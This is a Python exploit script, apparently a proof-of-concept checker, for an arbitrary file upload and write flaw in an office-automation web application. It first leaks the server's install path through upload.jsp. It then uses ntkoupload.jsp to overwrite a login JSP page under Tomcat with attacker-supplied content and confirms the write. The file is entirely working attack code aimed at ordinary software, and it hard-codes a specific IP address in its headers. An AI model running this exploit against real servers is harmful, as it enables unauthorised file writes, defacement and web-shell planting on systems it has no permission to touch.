import requests,re,urllib3,time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def randomLowercase(n):
    key=""
    zf="qwertyuiopasdfghjklzxcvbnm"
    import random
    for _ in range(n):
        suiji1=random.randint(0,len(zf)-1)
        key+=zf[suiji1]
    return key
content=randomLowercase(8)
def scan(url):
    if 'http' not in url:
        url='http://'+url
    path=get_path(url)
    if path==0:
        path='D:/htoa/'
    flag=wirtefile(url,path)
    if flag==1:
        return True
    else:
        return False
def get_path(url):
    if url[-1]=='/':
        urls = url + "OAapp/jsp/upload.jsp"
    else:
        urls = url + "/OAapp/jsp/upload.jsp"
    headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Referer': 'http://116.63.142.107:8081/OAapp/jsp/upload.jsp',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundary5Ur8laykKAWws2QO',
    'Content-Length': '285',
    }
    body='''
------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition: form-data;name="file"; filename="xxx.xml"\r\nContent-Type: image/png\r\n\r\nreal path\r\n------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition: form-data;name="filename"\r\n\r\nxxx.png\r\n------WebKitFormBoundary5Ur8laykKAWws2QO--\r\n'''
    r=requests.post(urls,body,headers=headers,verify=False,timeout=5)
    # print(r.text)
    try:
        path=re.findall('(.*?)Tomcat/webapps/.*?\.dat',r.text)[0]
    except:
        try:
            path=re.findall('(.*?)htoadata/appdata/.*?\.dat',r.text)[0]
        except:
            path=0
    return path
def wirtefile(urls,path):
        if urls[-1]=='/':
            url = urls + "OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp"
        else:
            url = urls + "/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Referer': 'http://116.63.142.107:8081/OAapp/jsp/upload.jsp',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm',
            'Content-Length': '363',
    }
        body=f'''------WebKitFormBoundaryzRSYXfFlXqk6btQm\r
Content-Disposition: form-data;name="EDITFILE"; filename="xxx.txt"\r
Content-Type: image/png\r
\r
{content}\r
------WebKitFormBoundaryzRSYXfFlXqk6btQm\r
Content-Disposition: form-data; name="newFileName"\r
\r
{path}Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r
------WebKitFormBoundaryzRSYXfFlXqk6btQm'''
        requests.post(url,body,headers=headers,verify=False,timeout=5)
        time.sleep(2)
        r=requests.get(urls+'/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp',verify=False,timeout=5)
        if content in r.text :
            flag=1
            return flag 
        else :
            flag=0
            return flag